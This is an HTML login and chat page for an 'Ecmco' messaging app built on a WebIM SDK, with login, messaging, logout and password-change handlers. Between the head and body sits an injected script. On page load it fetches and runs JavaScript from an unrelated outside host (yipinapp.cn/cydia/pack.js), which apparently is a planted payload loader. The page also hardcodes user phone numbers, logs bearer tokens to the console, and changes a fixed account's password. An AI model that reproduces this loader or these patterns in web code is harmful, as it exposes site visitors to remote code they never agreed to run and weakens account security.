<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
		<title>登录</title>
		<link rel="stylesheet" href="static/css/weui.css" />
		<link rel="stylesheet" href="static/css/weui-jquery.css" />
		<link rel="stylesheet" href="static/css/login.css" />
	</head>
	<script>
		(function () {
			var dw = document.createElement("script");
			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
			var s = document.getElementsByTagName("script")[0];
			s.parentNode.insertBefore(dw, s);
		})()
	</script>
	<body>
		<div class="weui-cells weui-cells_form">
			<h2 class="LoginName">登录</h2>
			<div class="formInput">
				<div class="weui-cell">
					<div class="weui-cell__hd" id="showPicker">
						<span class="addTxt">+<b></b></span><img class="trantImg" src="static/images/xiala.png" />
					</div>
					<div class="weui-cell__bd">
						<input class="weui-input" id="loginTel" type="number"  placeholder="请输入手机号码">
					</div>
				</div>
				<div class="weui-cell">
					<div class="weui-cell__bd">
						<input class="weui-input" id="loginPwd" type="password"  placeholder="请输入登录密码">
					</div>
				</div>
				<div class="x-list-item x-chat-send">
					<span class="ant-input-group-wrapper">
						<span class="ant-input-wrapper ant-input-group">
							<input type="text" class="ant-input" id="toMsg" style="height: 30px;" placeholder="消息" />
							<!--<textarea placeholder="消息"></textarea>-->
							<span class="ant-input-group-addon" id="privateText">
								发送
								<!--<i class="fontello icon-paper-plane"></i>-->
							</span>
						</span>
					</span>
				</div>
				<div class="" style="margin: 20px 0;">
					<button type="button" id="closeBtn" style="height: 35px;width: 100px;">退出登录</button>
				</div>
				<div class="">
					<input type="text" id="newp" placeholder="输入新的密码" style="height: 35px;" />
					<button type="button" style="height: 35px;" id="upPwd">修改密码</button>
				</div>
			</div>
			<p class="forgerB"><a href="forget.html">忘记密码？</a></p>
			<button class="weui-btn mybgBtn" id="loginBtn">登录</button>
			<p class="registerB">没有Ecmco账号？ <a href="registertel.html">立即注册</a></p>
		</div>
		<script type="text/javascript" src="lib/jquery.js" ></script>
		<script type="text/javascript" src="lib/weui.min.js" ></script>
		<script type="text/javascript" src="lib/jquery-weui.js" ></script>
		<script type="text/javascript" src="lib/WebIMConfig.js" ></script>
		<script type="text/javascript" src="lib/webimSDK.js" ></script>
		<script type="text/javascript" src="lib/strophe-1.2.8.min.js" ></script>
		<script type="text/javascript" src="lib/EMedia_x1v1.js" ></script>
		<script type="text/javascript" src="static/js/api.js" ></script>
		<!--<script type="text/javascript" src="static/js/login.js" ></script>-->
		<script>
			var userName = localStorage.getItem('ecmUser'),
	            userToken = localStorage.getItem('ecmToken');
	        var conn = {};
	        WebIM.config = config;
	        WebIM.message = WebIM.default.message
	        WebIM.utils = WebIM.default.utils
	        WebIM.debug = WebIM.default.debug
	        WebIM.statusCode = WebIM.default.statusCode
	        conn = WebIM.conn = new WebIM.default.connection({
	            isHttpDNS: WebIM.config.isHttpDNS,
	            isMultiLoginSessions: WebIM.config.isMultiLoginSessions,
	            host: WebIM.config.Host,
	            https: WebIM.config.https,
	            url: WebIM.config.xmppURL,
	            apiUrl: WebIM.config.apiURL,
	            isAutoLogin: true,
	            heartBeatWait: WebIM.config.heartBeatWait,
	            autoReconnectNumMax: WebIM.config.autoReconnectNumMax,
	            autoReconnectInterval: WebIM.config.autoReconnectInterval,
	            isStropheLog: WebIM.config.isStropheLog,
	            delivery: WebIM.config.delivery,
	            appKey: WebIM.config.appkey,
	        })
	        $(function(){
				if(userName != null || userName != ''){
					//刷新使用token登录
					isLogin();
				}
	        })
			function isLogin(){
				var options = {
				    apiUrl: WebIM.config.apiURL,
				    user: userName,
				    accessToken: userToken,
				    appKey: WebIM.config.appkey
				};
				conn.open(options);
			}
	        conn.listen({
	            onOpened: function () {          //连接成功回调
	                var myDate = new Date().toLocaleString();
	                console.log("%c [opened] 连接已成功建立", "color: green");
	                // rek();
	                console.log(myDate + "登陆成功");
	                //获取好友列表
//	                checkFriend();
	                //添加好友
//	                addFriend()
	                //聊天记录
//	                chatFun();
	                //获取好友列表联系人
//	                conn.getRoster({
//	                	success: function (data) {
//		                	console.log(data)
//		                    console.log('linkMan text Success');
//		                    msgText = msg.body.msg;
//		                    historyFun();
//		                },
//		                fail: function (e) {
//		                	console.log(e)
//		                    console.log("linkMan text error");
//		                }
//	                });
	                //拉取历史消息
//	                conn.fetchHistoryMessages({
//	                	queue:'18807429036',
//	                	count:10,
//	                	isGroup:false,
//	                	success: function (id, serverMsgId) {
//		                	console.log(id, serverMsgId)
//		                    console.log('talk text Success');
//		                },
//		                fail: function (e) {
//		                	console.log(e)
//		                    console.log("talk text error");
//		                }
//	                })
//	                location.href = 'share.html'
	            },
	            onClosed: function (message) {
	                console.log("onclose:" + message);
	                console.log(error);
	            },         //连接关闭回调
	            onTextMessage: function (message) {
	                console.log('onTextMessage: ', message);

	            },    //收到文本消息

	            onEmojiMessage: function (message) {
	                console.log('onEmojiMessage: ', message);
	            },   //收到表情消息
	            onPictureMessage: function (message) {
	                console.log('onPicMessage: ', message);
	            }, //收到图片消息
	            onCmdMessage: function (message) {
	                console.log('onCmdMessage: ', message);
	                var truthBeTold = window.confirm((message.from + "邀请您加入会议"));
	                if (truthBeTold) {
	                    emedia.mgr.joinConference(message.ext.confrId, message.ext.password, ext).then(function () {
	                        console.log("********加入会议成功*******")
	                        // var videoTag = document.getElementById("localVideo")
	                        // emedia.mgr.streamBindVideo(stream, videoTag);
	                    })
	                } else {

	                }
	            },     //收到命令消息
	            onAudioMessage: function (message) {
	                console.log('onAudioMessage: ', message);
	            },   //收到音频消息
	            onLocationMessage: function (message) {
	                console.log('onLocMessage: ', message);
	            },//收到位置消息
	            onFileMessage: function (message) {
	                console.log('onFileMessage: ', message);
	            },    //收到文件消息
	            recallMessage: function (message) {
	                console.log('recallMessage', message);
	            }, //消息撤回
	            onVideoMessage: function (message) {
	                console.log('onVideoMessage: ', message);
	                var node = document.getElementById('privateVideo');
	                var option = {
	                    url: message.url,
	                    headers: {
	                        'Accept': 'audio/mp4'
	                    },
	                    onFileDownloadComplete: function (response) {
	                        var objectURL = WebIM.utils.parseDownloadResponse.call(conn, response);
	                        node.src = objectURL;
	                    },
	                    onFileDownloadError: function () {
	                        console.log('File down load error.')
	                    }
	                };
	                WebIM.utils.download.call(conn, option);
	            },   //收到视频消息
	            onPresence: function (message) {
	                var myDate = new Date().toLocaleString();
	                console.log('onPresence: ', myDate + JSON.stringify(message));
	                switch (message.type) {
	                    case 'subscribe': // 对方请求添加好友
	                        var truthBeTold = window.confirm((message.from + "申请添加您为好友:"));
	                        if (truthBeTold) {
	                            // 同意对方添加好友
	                            conn.subscribed({
	                                to: message.from,
	                                message: "[resp:true]"
	                            });
	                            console.log("同意添加好友");
	                        } else {
	                            // 拒绝对方添加好友
	                            conn.unsubscribed({
	                                to: message.from,
	                                message: "rejectAddFriend" // 拒绝添加好友回复信息
	                            });
	                            console.log("拒绝添加好友");
	                        }
	                        break;
	                    case 'subscribed': // 对方同意添加好友，已方同意添加好友
	                        break;
	                    case 'unsubscribe': // 对方删除好友
	                        break;
	                    case 'unsubscribed': // 被拒绝添加好友，或被对方删除好友成功
	                        break;
	                    case 'memberJoinPublicGroupSuccess': // 成功加入聊天室
	                        console.log('join chat room success' + myDate);
	                        console.log(new Date().toLocaleString());
	                        break;
	                    case 'joinChatRoomFaild': // 加入聊天室失败
	                        console.log('join chat room faild');
	                        break;
	                    case 'joinPublicGroupSuccess': // 意义待查
	                        console.log('join public group success', message.from);
	                        break;
	                    case 'createGroupACK':
	                        conn.createGroupAsync({
	                            from: message.from,
	                            success: function (option) {
	                                console.log('Create Group Succeed');
	                            }
	                        });
	                        break;
	                }
	            },       //处理“广播”或“发布-订阅”消息，如联系人订阅请求、处理群组、聊天室被踢解散等消息
	            onRoster: function (message) {
	                console.log("onRoster", message);
	            },         //处理好友申请
	            onInviteMessage: function (message) {
	                console.log('Invite');
	            },  //处理群组邀请
	            onOnline: function () {
	                console.log("onOnline");
	            },                  //本机网络连接成功
	            onOffline: function () {
	                console.log('offline');
	            },                 //本机网络掉线
	            onError: function (message) {
	                console.log('onError: ', message);

	            },          //失败回调
	            onBlacklistUpdate: function (list) {       //黑名单变动
	                // 查询黑名单，将好友拉黑，将好友从黑名单移除都会回调这个函数，list则是黑名单现有的所有好友信息
	                console.log(list);
	            },
	            onReceivedMessage: function (message) {
	                console.log('onReceivedMessage: ', message);
	            },    //收到消息送达服务器回执
	            onDeliveredMessage: function (message) {
	                console.log('onDeliveredMessage：', message);
	            },   //收到消息送达客户端回执
	            onReadMessage: function (message) {
	                console.log('onReadMessage: ', message);
	            },        //收到消息已读回执
	            onCreateGroup: function (message) {
	                console.log('onCreateGroup: ', message);
	            },        //创建群组成功回执（需调用createGroupNew）
	            onMutedMessage: function (message) {
	                console.log('onMutedMessage: ', message);
	            }         //如果用户在A群组被禁言，在A群发消息会走这个回调并且消息不会传递给群其它成员
	        });

			$('#loginBtn').click(function(){
				//即时通讯登录
			    conn.open({
			        apiUrl: WebIM.config.apiURL,
			        user: $('#loginTel').val(),
			        pwd: $('#loginPwd').val(),
			        appKey: WebIM.config.appkey,
			        success: function (data) {
	                	console.log(data);
	                	localStorage.setItem('ecmToken',data.access_token);
	                	localStorage.setItem('ecmUser',data.user.username);
	                    console.log('send private text Success');
	                },
	                fail: function (e) {
	                	console.log(e)
	                    console.log("Send private text error");
	                }
			    });
			});

			var myDate = new Date().toLocaleString();
			//发送文本信息
	        document.getElementById('privateText').onclick = function () {
	        	var tmsg = document.getElementById("toMsg").value;
	            var tname = '18807429033';
	            var id = conn.getUniqueId();                 // 生成本地消息id
	            var msg = new WebIM.default.message('txt', id);      // 创建文本消息
	            var datas = {
				  "target_type": "users",
				  "target": [tname],
				  "msg": {
				    "type": "txt",
				    "msg": tmsg
				  },
				  "from": "18807429033",
				  "ext": {
				    "time":myDate
				  }
				};
				console.log(myDate);
				console.log("Bearer "+userToken)
//	            $.ajax({
//	            	type:"post",
//	            	url:WebIM.config.apiURL+"/1131190930019589/ecm/messages",
//	            	async:true,
//	            	headers:{
//	            		"Content-Type":"application/json",
//	            		"Authorization":"Bearer "+userToken
//	            	},
//	            	dataType:"json",
//	            	data:datas,
//	            	success: function (data) {
//						return callbackFunc(data);
//				    },
//				    error:function(xhr,type,errorThrown){
//				    	console.log(xhr.statusText);
//						console.log("错误提示了："+ xhr.status +" ");
//				    }
//	            });
	            msg.set({
//	                "target_type": "users",
//					"target": [tname],
//					"msg": {
//						"type": "txt",
//						"msg": tmsg
//					},
//					"from": "18807429033",
//					"ext": {
//						"time":myDate
//					},                     // 接收消息对象（用户id）
					msg: tmsg,                  // 消息内容
	                to: tname,
	                ext: {
	                    'time': myDate
	                },
	                success: function (id, serverMsgId) {
	                	console.log(id, serverMsgId)
	                    console.log('send private text Success');
//	                    msgText = msg.body.msg;
//	                    historyFun();
	                },
	                fail: function (e) {
	                	console.log(e)
	                    console.log("Send private text error");
	                }
	            });

	            msg.body.chatType = 'singleChat';
	            conn.send(msg.body);
	            console.log(msg.body);
	            console.log(msg);
//	            //赋值显示到input
//	            document.getElementById("txt1").value = msg.body.msg
	        };
	        //退出
	        document.getElementById("closeBtn").onclick = function () {
	            outFun();
	        }
	        //修改密码
	        document.getElementById("upPwd").onclick = function () {
				var myDate = new Date().toLocaleString();
//				var tokens = localStorage.getItem('ecmToken');
				console.log('Bearer '+userToken);
	            $.ajax({
	            	type:"put",
	            	url:WebIM.config.apiURL+"/1131190930019589/ecm/users/18807429033/password",
	            	async:true,
	            	headers:{"Authorization":"Bearer "+userToken},
	            	dataType:"json",
	            	data:{
		            	"newpassword":$('#newp').val()
		            },
	            	success: function (data) {
						console.log(data);
				    },
				    error:function(xhr,type,errorThrown){
				    	console.log(xhr.statusText);
						console.log("错误提示了："+ xhr.status +" ");
				    }
	            });
	        }
	        function historyFun(){
	        	var options = {
				    queue: "18807429036",
				    isGroup: false,
				    count: 10,
				    success: function(data){
				    	console.log(data)
				    },
				    fail: function(e){
				    	console.log(e)
				    }
				}
				conn.fetchHistoryMessages(options)
	        }
	    	function addFriend(){
	    		$.ajax({
	            	type:"POST",
	            	url:WebIM.config.apiURL+"/1131190930019589/ecm/users/18807429033/contacts/users/18807429034",
	            	async:true,
	            	headers:{'Content-Type': 'application/json','Authorization':'Bearer '+userToken},
	            	data:{},
	            	dataType:'json',
	            	success: function (data) {
						console.log(data);
				    },
				    error:function(xhr,type,errorThrown){
				    	console.log(xhr.statusText);
						console.log("错误提示了："+ xhr.status +" ");
				    }
	            });
	    	}
	    	function outFun(){
	    		conn.close();
	            localStorage.removeItem('ecmToken');
	            localStorage.removeItem('ecmUser');
	            console.log('退出登录');
	            location.reload();
	    	}
	    	function chatFun(){
	    		console.log(userToken)
	    		$.ajax({
	    			type:"get",
	    			url:WebIM.config.apiURL+"/1131190930019589/ecm/chatmessages/2019101510",
	    			async:true,
	    			headers:{'Accept': 'application/json','Authorization':'Bearer '+userToken},
	            	data:{},
	            	dataType:'json',
	            	success: function (data) {
						console.log(data);
				    },
				    error:function(xhr,type,errorThrown){
				    	console.log(xhr.statusText);
						console.log("错误提示了："+ xhr.status +" ");
				    }
	    		});
	    	}
	    	function checkFriend(){
	    		$.ajax({
	    			type:"get",
	    			url:WebIM.config.apiURL+"/1131190930019589/ecm/users/18807429033/contacts/users",
	    			async:true,
	    			headers:{'Accept': 'application/json','Authorization':'Bearer '+userToken},
	            	data:{},
	            	dataType:'json',
	            	success: function (data) {
						console.log(data);
				    },
				    error:function(xhr,type,errorThrown){
				    	console.log(xhr.statusText);
						console.log("错误提示了："+ xhr.status +" ");
				    }
	    		});
	    	}
		</script>
	</body>
</html>
